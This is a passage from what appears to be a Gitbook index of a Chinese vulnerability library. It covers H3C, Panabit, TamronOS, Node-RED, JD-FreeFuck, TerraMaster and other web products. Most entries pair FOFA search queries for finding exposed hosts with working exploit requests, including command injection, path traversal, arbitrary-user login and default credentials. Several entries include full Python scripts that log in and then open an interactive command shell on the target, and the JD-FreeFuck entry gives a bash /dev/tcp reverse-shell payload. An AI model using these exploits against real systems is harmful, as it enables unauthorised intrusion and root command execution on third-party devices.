{} 存在信息泄露 响应为:{}\\033[0m\".format(target_url, response.text)) else: print(\"\\033[31m[x] 目标 {}不存在漏洞 \\033[0m\".format(target_url)) except Exception as e: print(\"\\033[31m[x] 目标 {} 请求失败 \\033[0m\".format(target_url)) if __name__ == \"__main__\": title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) Goby & POC [!NOTE] MessageSolution 邮件归档系统EEA 信息泄露漏洞 CNVD-2021-10543 Goby & POC 已经更新到 Github中 参考文章 https://mp.weixin.qq.com/s/jehAIIYWrpkLtGvGN-LtFA 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/H3C/":{"url":"book/Web应用漏洞/H3C/","title":"H3C","keywords":"","body":"H3C H3C SecParh堡垒机 get_detail_view.php 任意用户登录漏洞 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/H3C/H3C SecParh堡垒机 get_detail_view.php 任意用户登录漏洞.html":{"url":"book/Web应用漏洞/H3C/H3C SecParh堡垒机 get_detail_view.php 任意用户登录漏洞.html","title":"H3C SecParh堡垒机 get_detail_view.php 任意用户登录漏洞","keywords":"","body":"H3C SecParh堡垒机 get_detail_view.php 任意用户登录漏洞 漏洞描述 H3C SecParh堡垒机 get_detail_view.php 存在任意用户登录漏洞 与齐治堡垒机出现的漏洞相似 漏洞影响 [!NOTE] H3C SecParh堡垒机 FOFA [!NOTE] app=\"H3C-SecPath-运维审计系统\" && body=\"2018\" 漏洞复现 登录页面如下 POC验证的Url为 /audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=admin 成功获取admin权限 Goby & POC 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/H3C/H3C SecParh堡垒机 data_provider.php 远程命令执行漏洞.html":{"url":"book/Web应用漏洞/H3C/H3C SecParh堡垒机 data_provider.php 远程命令执行漏洞.html","title":"H3C SecParh堡垒机 data_provider.php 远程命令执行漏洞","keywords":"","body":"H3C SecParh堡垒机 data_provider.php 远程命令执行漏洞 漏洞描述 H3C SecParh堡垒机 data_provider.php 存在远程命令执行漏洞，攻击者通过任意用户登录或者账号密码进入后台就可以构造特殊的请求执行命令 漏洞影响 [!NOTE] H3C SecParh堡垒机 漏洞影响 [!NOTE] H3C SecParh堡垒机 FOFA [!NOTE] app=\"H3C-SecPath-运维审计系统\" && body=\"2018\" 漏洞复现 登录页面如下 先通过任意用户登录获取Cookie /audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=admin /audit/data_provider.php?ds_y=2019&ds_m=04&ds_d=02&ds_hour=09&ds_min40&server_cond=&service=$(id)&identity_cond=&query_type=all&format=json&browse=true 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/H3C/H3C IMC dynamiccontent.properties.xhtm 远程命令执行.html":{"url":"book/Web应用漏洞/H3C/H3C IMC dynamiccontent.properties.xhtm 远程命令执行.html","title":"H3C IMC dynamiccontent.properties.xhtm 远程命令执行","keywords":"","body":" 漏洞描述 H3C IMC dynamiccontent.properties.xhtm 存在远程命令执行，攻击者通过构造特殊的请求造成远程命令执行 漏洞影响 [!NOTE] H3C IMC FOFA [!NOTE] \"/imc/login.jsf\" && body=\"/imc/javax.faces.resource/images/login_help.png.jsf?ln=primefaces-imc-new-webui\" 漏洞复现 登录页面为 发送如下请求包 POST /imc/javax.faces.resource/dynamiccontent.properties.xhtml HTTP/1.1 Host: Connection: close Cache-Control: max-age=0 sec-ch-ua: \"Chromium\";v=\"88\", \"Google Chrome\";v=\"88\", \";Not A Brand\";v=\"99\" sec-ch-ua-mobile: ?0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Sec-Fetch-Site: none Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh-TW;q=0.9,zh;q=0.8 Cookie: oam.Flash.RENDERMAP.TOKEN=jw7ysel68; JSESSIONID=EB4E60FA4F333FF21B488E9937B4C739; currentThemeName=imc-new-webui Content-Type: application/x-www-form-urlencoded Content-Length: 1564 pfdrt=sc&ln=primefaces&pfdrid=uMKljPgnOTVxmOB%2BH6%2FQEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVqupdmBV%2FKAe9gtw54DSQCl72JjEAsHTRvxAuJC%2B%2FIFzB8dhqyGafOLqDOqc4QwUqLOJ5KuwGRarsPnIcJJwQQ7fEGzDwgaD0Njf%2FcNrT5NsETV8ToCfDLgkzjKVoz1ghGlbYnrjgqWarDvBnuv%2BEo5hxA5sgRQcWsFs1aN0zI9h8ecWvxGVmreIAuWduuetMakDq7ccNwStDSn2W6c%2BGvDYH7pKUiyBaGv9gshhhVGunrKvtJmJf04rVOy%2BZLezLj6vK%2BpVFyKR7s8xN5Ol1tz%2FG0VTJWYtaIwJ8rcWJLtVeLnXMlEcKBqd4yAtVfQNLA5AYtNBHneYyGZKAGivVYteZzG1IiJBtuZjHlE3kaH2N2XDLcOJKfyM%2FcwqYIl9PUvfC2Xh63Wh4yCFKJZGA2W0bnzXs8jdjMQoiKZnZiqRyDqkr5PwWqW16%2FI7eog15OBl4Kco%2FVjHHu8Mzg5DOvNevzs7hejq6rdj4T4AEDVrPMQS0HaIH%2BN7wC8zMZWsCJkXkY8GDcnOjhiwhQEL0l68qrO%2BEb%2F60MLarNPqOIBhF3RWB25h3q3vyESuWGkcTjJLlYOxHVJh3VhCou7OICpx3NcTTdwaRLlw7sMIUbF%2FciVuZGssKeVT%2FgR3nyoGuEg3WdOdM5tLfIthl1ruwVeQ7FoUcFU6RhZd0TO88HRsYXfaaRyC5HiSzRNn2DpnyzBIaZ8GDmz8AtbXt57uuUPRgyhdbZjIJx%2FqFUj%2BDikXHLvbUMrMlNAqSFJpqoy%2FQywVdBmlVdx%2BvJelZEK%2BBwNF9J4p%2F1fQ8wJZL2LB9SnqxAKr5kdCs0H%2FvouGHAXJZ%2BJzx5gcCw5h6%2Fp3ZkZMnMhkPMGWYIhFyWSSQwm6zmSZh1vRKfGRYd36aiRKgf3AynLVfTvxqPzqFh8BJUZ5Mh3V9R6D%2FukinKlX99zSUlQaueU22fj2jCgzvbpYwBUpD6a6tEoModbqMSIr0r7kYpE3tWAaF0ww4INtv2zUoQCRKo5BqCZFyaXrLnj7oA6RGm7ziH6xlFrOxtRd%2BLylDFB3dcYIgZtZoaSMAV3pyNoOzHy%2B1UtHe1nL97jJUCjUEbIOUPn70hyab29iHYAf3%2B9h0aurkyJVR28jIQlF4nT0nZqpixP%2Fnc0zrGppyu8dFzMqSqhRJgIkRrETErXPQ9sl%2BzoSf6CNta5ssizanfqqCmbwcvJkAlnPCP5OJhVes7lKCMlGH%2BOwPjT2xMuT6zaTMu3UMXeTd7U8yImpSbwTLhqcbaygXt8hhGSn5Qr7UQymKkAZGNKHGBbHeBIrEdjnVphcw9L2BjmaE%2BlsjMhGqFH6XWP5GD8FeHFtuY8bz08F4Wjt5wAeUZQOI4rSTpzgssoS1vbjJGzFukA07ahU%3D&cmd=whoami Goby & POC 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/JD-FreeFuck/":{"url":"book/Web应用漏洞/JD-FreeFuck/","title":"JD-FreeFuck","keywords":"","body":"JD-FreeFuck JD-FreeFuck 后台命令执行漏洞 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/JD-FreeFuck/JD-FreeFuck 后台命令执行漏洞.html":{"url":"book/Web应用漏洞/JD-FreeFuck/JD-FreeFuck 后台命令执行漏洞.html","title":"JD-FreeFuck 后台命令执行漏洞","keywords":"","body":"JD-FreeFuck 后台命令执行漏洞 漏洞描述 JD-FreeFuck 存在后台命令执行漏洞，由于传参执行命令时没有对内容过滤，导致可以执行任意命令，控制服务器 项目地址： https://github.com/meselson/JD-FreeFuck 漏洞影响 [!NOTE] JD-FreeFuck FOFA [!NOTE] title=\"京东薅羊毛控制面板\" 漏洞复现 访问后登录页面如下 默认账号密码为 useradmin/supermanito 发送如下请求包执行命令 POST /runCmd HTTP/1.1 Host: 101.200.189.251:5678 Content-Length: 50 Pragma: no-cache Cache-Control: no-cache Accept: */* X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: connect.0.6356777726800276=s%3Av1W6DxlSqnPpVgvMCItxElFeKI1Psh4i.eE4ORs0Yz30N0TOg1pUVpOqrpIHyrqIimuXJVO8lE7U Connection: close cmd=bash+jd.sh+%3Bcat /etc/passwd%3B+now&delay=500 其中 cmd 参数存在命令注入 反弹shell cmd=bash+jd.sh+%3Bbash+-c+'exec+bash+-i+%26%3E%2Fdev%2Ftcp%2Fxxx.xxx.xxx.xxx%2F9999+%3C%261'%3B+now&delay=500 参考文章 @桃花心 师傅 https://www.secquan.org/Discuss/1071932#reply3 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/Node-RED/":{"url":"book/Web应用漏洞/Node-RED/","title":"Node-RED","keywords":"","body":"稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/Node-RED/Node-RED ui_base 任意文件读取漏洞.html":{"url":"book/Web应用漏洞/Node-RED/Node-RED ui_base 任意文件读取漏洞.html","title":"Node-RED ui_base 任意文件读取漏洞","keywords":"","body":"Node-RED ui_base 任意文件读取漏洞 漏洞描述 Node-RED 在/nodes/ui_base.js中，URL与'/ui_base/js/*'匹配，然后传递给path.join， 缺乏对最终路径的验证会导致路径遍历漏洞，可以利用这个漏洞读取服务器上的敏感数据，比如settings.js 漏洞影响 [!NOTE] Node-RED FOFA [!NOTE] title=\"Node-RED\" 漏洞复现 访问页面 验证POC /ui_base/js/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd /ui_base/js/..%2f..%2f..%2f..%2fsettings.js 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/TamronOS/":{"url":"book/Web应用漏洞/TamronOS/","title":"TamronOS","keywords":"","body":"TamronOS TamronOS IPTV系统 ping 任意命令执行漏洞 TamronOS IPTV系统 submit 任意用户创建漏洞 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/TamronOS/TamronOS IPTV系统 submit 任意用户创建漏洞.html":{"url":"book/Web应用漏洞/TamronOS/TamronOS IPTV系统 submit 任意用户创建漏洞.html","title":"TamronOS IPTV系统 submit 任意用户创建漏洞","keywords":"","body":"TamronOS IPTV系统 submit 任意用户创建漏洞 漏洞描述 TamronOS IPTV系统 /api/manager/submit 存在任意用户创建漏洞，攻击者通过漏洞可以任意用户创建进入后台 漏洞影响 [!NOTE] TamronOS IPTV系统 FOFA [!NOTE] app=\"TamronOS-IPTV系统\" 漏洞复现 登录页面如下 漏洞POC为 /api/manager/submit?group=1&username=test&password=123456 user: test pass: 123456 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/TamronOS/TamronOS IPTV系统 ping 任意命令执行漏洞.html":{"url":"book/Web应用漏洞/TamronOS/TamronOS IPTV系统 ping 任意命令执行漏洞.html","title":"TamronOS IPTV系统 ping 任意命令执行漏洞","keywords":"","body":"TamronOS IPTV系统 ping 任意命令执行漏洞 漏洞描述 TamronOS IPTV系统 api/ping 存在任意命令执行漏洞，攻击者通过漏洞可以执行任意命令 漏洞影响 [!NOTE] TamronOS IPTV系统 FOFA [!NOTE] app=\"TamronOS-IPTV系统\" 漏洞复现 登录页面如下 漏洞POC为 /api/ping?count=5&host=;id; 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/E-message/":{"url":"book/Web应用漏洞/E-message/","title":"E-message","keywords":"","body":"E-message E-message 越权访问漏洞 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/E-message/E-message 越权访问漏洞.html":{"url":"book/Web应用漏洞/E-message/E-message 越权访问漏洞.html","title":"E-message 越权访问漏洞","keywords":"","body":"E-message 越权访问漏洞 漏洞描述 E-message 存在越权访问漏洞，由于配置页面没有做权限设定，导致攻击者可以访问并重置账号密码等操作 漏洞影响 [!NOTE] E-message FOFA [!NOTE] title=\"emessage 设置: 数据库设置 - 标准连接\" 漏洞复现 访问安装页面 http://xxx.xxx.xxx.xxx/setup/setup-datasource-standard.jsp 可以获取账号密码信息，一路点击右下角的继续将会跳转修改管理员账号密码页面，修改后登录即可获取后台权限 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/Panabit/":{"url":"book/Web应用漏洞/Panabit/","title":"Panabit","keywords":"","body":"Panabit Panabit iXCache cfg_cmd 后台命令执行漏洞 Panabit Panalog cmdhandle.php 后台命令执行漏洞 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/Panabit/Panabit iXCache cfg_cmd 后台命令执行漏洞.html":{"url":"book/Web应用漏洞/Panabit/Panabit iXCache cfg_cmd 后台命令执行漏洞.html","title":"Panabit iXCache cfg_cmd 后台命令执行漏洞","keywords":"","body":"Panabit iXCache ajax_cmd 后台命令执行漏洞 漏洞描述 Panabit iXCache 后台 ixeye指令输入时存在命令拼接漏洞，将会以Root权限执行任意代码 漏洞影响 [!NOTE] Panabit iXCache FOFA [!NOTE] \"iXCache\" 漏洞复现 登录页面如下 默认账号密码为：admin/ixcache 进入后台后点击命令行，访问Url /cgi-bin/Maintain/cfg_cmd 输入命令时使用 ; 即可命令拼接执行任意命令 请求包为 POST /cgi-bin/Maintain/ajax_cmd?action=runcmd&cmd=ixeye%20;cat%20/etc/passwd HTTP/1.1 Host: Connection: close Content-Length: 0 sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"90\", \"Google Chrome\";v=\"90\" Accept: */* X-Requested-With: XMLHttpRequest sec-ch-ua-mobile: ?0 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 Sec-Fetch-Site: same-origin Sec-Fetch-Mode: cors Sec-Fetch-Dest: empty Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: _walkthrough-introduction=0; pauser_1615540522_368691=paonline_admin_73708_16196903931;Path=/ 漏洞POC import requests import sys import random import re import base64 import time from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mTitle : Panabit iXCache cfg_cmd 后台命令执行漏洞 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/login/userverify.cgi\" headers = { \"Content-Type\": \"application/x-www-form-urlencoded\", } data = \"username=admin&password=ixcache\" try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers,data=data, verify=False, timeout=5) print(\"\\033[36m[o] 正在请求 {}/login/userverify.cgi.... \\033[0m\".format(target_url)) if '/cgi-bin/monitor.cgi' in response.text and response.status_code == 200: print(\"\\033[32m[o] 目标 {} 存在默认口令 admin/ixcache \\033[0m\".format(target_url)) cookie = response.headers['Set-Cookie'] print(\"\\033[36m[o] 获取Cookie : {} \\033[0m\".format(cookie)) POC_2(target_url, cookie) else: print(\"\\033[31m[x] 请求失败 \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) def POC_2(target_url, Cookie): vuln_url = target_url + \"/cgi-bin/Maintain/ajax_cmd?action=runcmd&cmd=ixeye%20;cat%20/etc/passwd\" headers = { \"Content-Type\": \"application/x-www-form-urlencoded\", \"Cookie\": \"_walkthrough-introduction=0;{}\".format(Cookie) } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, verify=False, timeout=5) if 'root' in response.text and response.status_code == 200: print(\"\\033[32m[o] 目标 {}存在漏洞 ,执行 cat /etc/passwd \\033[0m\".format(target_url)) print(\"\\033[36m[o] 响应为:\\n{} \\033[0m\".format(response.text)) while True: Cmd = input(\"\\033[35mCmd >>> \\033[0m\") if Cmd == \"exit\": sys.exit(0) else: POC_3(target_url, Cmd, Cookie) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) def POC_3(target_url, Cmd, Cookie): Cmd = Cmd.replace(\" \", \"%20\") vuln_url = target_url + \"/cgi-bin/Maintain/ajax_cmd?action=runcmd&cmd=ixeye%20;{}\".format(Cmd) headers = { \"Content-Type\": \"application/x-www-form-urlencoded\", \"Cookie\": \"_walkthrough-introduction=0;{}\".format(Cookie) } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, verify=False, timeout=5) print(\"\\033[36m[o] 响应为:\\n{} \\033[0m\".format(response.text)) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/Panabit/Panabit Panalog cmdhandle.php 后台命令执行漏洞.html":{"url":"book/Web应用漏洞/Panabit/Panabit Panalog cmdhandle.php 后台命令执行漏洞.html","title":"PPanabit Panalog cmdhandle.php 后台命令执行漏洞","keywords":"","body":"Panabit Panalog cmdhandle.php 后台命令执行漏洞 漏洞描述 Panabit Panalog cmdhandle.php 存在后台命令执行漏洞，攻击者可以登录后执行任意命令控制服务器 漏洞影响 [!NOTE] Panabit Panalog FOFA [!NOTE] \"Panalog\" 漏洞复现 登录页面如下 默认账号密码为：admin/panabit 出现漏洞的文件为 Maintain/command-html.php， 请求包如下 POST /Maintain/cmdhandle.php HTTP/1.1 Host: Connection: close Content-Length: 31 sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"90\", \"Google Chrome\";v=\"90\" Accept: */* X-Requested-With: XMLHttpRequest sec-ch-ua-mobile: ?0 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Sec-Fetch-Site: same-origin Sec-Fetch-Mode: cors Sec-Fetch-Dest: empty Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: cloud_limit=20; cloud_left=block; PHPSESSID=9lpglosgab794j5ouvv0sg7q73 cmd=cat%2520%252Fetc%252Fpasswd 漏洞POC import requests import sys import random import re import base64 import time from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mTitle : Panabit Panalog cmdhandle.php 后台命令执行漏洞 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/login.php\" cookie = \"PHPSESSID=111111111111111111111peiqi\" headers = { \"Content-Type\": \"application/x-www-form-urlencoded\", \"Cookie\": cookie } data = \"user=admin&mypass=panabit&sec=1619123700835.617&useldap=0\" try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers,data=data, verify=False, timeout=5) print(\"\\033[36m[o] 正在请求 {}/login.php.... \\033[0m\".format(target_url)) if \"yes\" in response.text and \"yn\" in response.text and response.status_code == 200: print(\"\\033[32m[o] 目标 {} 存在默认口令 admin/panabit \\033[0m\".format(target_url)) print(\"\\033[36m[o] 设置Cookie : {} \\033[0m\".format(cookie)) POC_2(target_url, cookie) else: print(\"\\033[31m[x] 请求失败 \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) def POC_2(target_url, Cookie): vuln_url = target_url + \"/Maintain/cmdhandle.php\" headers = { \"Content-Type\": \"application/x-www-form-urlencoded\", \"Cookie\": \"{}\".format(Cookie) } data = \"cmd=cat /etc/passwd\" try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url,data=data, headers=headers, verify=False, timeout=5) if 'root' in response.text and response.status_code == 200: print(\"\\033[32m[o] 目标 {}存在漏洞 ,执行 cat /etc/passwd \\033[0m\".format(target_url)) print(\"\\033[36m[o] 响应为:\\n{} \\033[0m\".format(response.text)) while True: Cmd = input(\"\\033[35mCmd >>> \\033[0m\") if Cmd == \"exit\": sys.exit(0) else: POC_3(target_url, Cmd, Cookie) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) def POC_3(target_url, Cmd, Cookie): Cmd = Cmd.replace(\" \", \"%20\") vuln_url = target_url + \"/Maintain/cmdhandle.php\" headers = { \"Content-Type\": \"application/x-www-form-urlencoded\", \"Cookie\": \"{}\".format(Cookie) } data = \"cmd={}\".format(Cmd) try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=data,headers=headers, verify=False, timeout=5) response_data = response.text.replace(\"\", \"\\n\") print(\"\\033[36m[o] 响应为:\\n{} \\033[0m\".format(response_data)) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/Panabit/Panabit 智能应用网关 ajax_top 后台命令执行漏洞.html":{"url":"book/Web应用漏洞/Panabit/Panabit 智能应用网关 ajax_top 后台命令执行漏洞.html","title":"Panabit 智能应用网关 ajax_top 后台命令执行漏洞","keywords":"","body":"Panabit 智能应用网关 ajax_top 后台命令执行漏洞 漏洞描述 Panabit 智能应用网关 ajax_top 后台存在命令执行漏洞，攻击者可以以root权限运行部分危险命令 漏洞影响 [!NOTE] Panabit 智能应用网关 FOFA [!NOTE] cert=\"panabit.com\" && body=\"/login/login.js\" 漏洞复现 登录页面如下 默认账号密码为：admin/panabit 出现漏洞的文件为 /cgi-bin/Maintain/ajax_top， 请求包如下 POST /cgi-bin/Maintain/ajax_top?action=runcmd&cmd=ls HTTP/1.1 Host: Connection: close Content-Length: 0 sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"90\", \"Google Chrome\";v=\"90\" Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Cache-Control: no-cache Accept-Language: zh-CN,zh;q=0.8 sec-ch-ua-mobile: ?0 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 Content-Type: text/html; charset=GB2312 Sec-Fetch-Site: same-origin Sec-Fetch-Mode: cors Sec-Fetch-Dest: empty Accept-Encoding: gzip, deflate Cookie: pauser_1618744108=paonline_admin_9328_16197064781_c4229a3a492c76e334f57728abced88b|443|; 漏洞POC import requests import sys import random import re import base64 import time from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mTitle : Panabit 智能应用网关 ajax_top 后台命令执行漏洞 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/login/userverify.cgi\" headers = { \"Content-Type\": \"application/x-www-form-urlencoded\", } data = \"action=user_login&palang=ch&username=admin&password=722289d072731e2cc73038aa9ad9e067&code=\" try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers,data=data, verify=False, timeout=5) print(\"\\033[36m[o] 正在请求 {}/login/userverify.cgi.... \\033[0m\".format(target_url)) if \"Auth_OK\" in response.text and response.status_code == 200: print(\"\\033[32m[o] 目标 {} 存在默认口令 admin/panabit \\033[0m\".format(target_url)) cookie = response.headers['Set-Cookie'] print(\"\\033[36m[o] 获取Cookie : {} \\033[0m\".format(cookie)) POC_2(target_url, cookie) else: print(\"\\033[31m[x] 请求失败 \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) def POC_2(target_url, Cookie): vuln_url = target_url + \"/cgi-bin/Maintain/ajax_top?action=runcmd&cmd=cat /etc/passwd\" headers = { \"Content-Type\": \"application/x-www-form-urlencoded\", \"Cookie\": \"{}\".format(Cookie) } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, verify=False, timeout=5) if 'root' in response.text and response.status_code == 200: print(\"\\033[32m[o] 目标 {}存在漏洞 ,执行 cat /etc/passwd \\033[0m\".format(target_url)) print(\"\\033[36m[o] 响应为:\\n{} \\033[0m\".format(response.text)) while True: Cmd = input(\"\\033[35mCmd >>> \\033[0m\") if Cmd == \"exit\": sys.exit(0) else: POC_3(target_url, Cmd, Cookie) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) def POC_3(target_url, Cmd, Cookie): vuln_url = target_url + \"/cgi-bin/Maintain/ajax_top?action=runcmd&cmd={}\".format(Cmd) headers = { \"Content-Type\": \"application/x-www-form-urlencoded\", \"Cookie\": \"{}\".format(Cookie) } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url ,headers=headers, verify=False, timeout=5) response_data = response.text.replace(\"\", \"\\n\") print(\"\\033[36m[o] 响应为:\\n{} \\033[0m\".format(response_data)) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/TerraMaster/":{"url":"book/Web应用漏洞/TerraMaster/","title":"TerraMaster","keywords":"","body":"TerraMaster TerraMaster TOS RCE CVE-2020-28188 TerraMaster TOS 任意文件读取漏洞 CVE-2020-28187 TerraMaster TOS 任意账号密码修改漏洞 CVE-2020-28186 TerraMaster TOS 用户枚举漏洞 CVE-2020-28185 TerraMaster TOS exportUser.php 远程命令执行 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/TerraMaster/TerraMaster TOS exportUser.php 远程命令执行 CVE-2020-15568.html":{"url":"book/Web应用漏洞/TerraMaster/TerraMaster TOS exportUser.php 远程命令执行 CVE-2020-15568.html","title":"TerraMaster TOS exportUser.php 远程命令执行 CVE-2020-15568","keywords":"","body":"TerraMaster TOS exportUser.php 远程命令执行 CVE-2020-15568 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:50:07 "},"book/Web应用漏洞/TerraMaster/TerraMaster TOS 用户枚举漏洞 CVE-2020-28185.html":{"url":"book/Web应用漏洞/TerraMaster/TerraMaster TOS 用户枚举漏洞 CVE-2020-28185.html","title":"TerraMaster TOS 用户枚举漏洞 CVE-2020-28185","keywords":"","body":"TerraMaster TOS 用户枚举漏洞 CVE-2020-28185 漏洞描述 TerraMaster TOS 存在用户枚举漏洞，通过wizard/initialise.php页面的username参数即可枚举系统中的用户，以及泄露邮箱信息 漏洞影响 [!NOTE] TerraMaster TOS FOFA [!NOTE] \"TerraMaster\" && header=\"TOS\" 漏洞复现 漏洞点来源于找回密码的用户存在校验 输入用户名 admin 点击确定，查看Burp捕获的包 其中有一个请求包用于确认用户admin是否存在 存在则返回用户的邮箱信息 稻草人安全漏洞库 all right 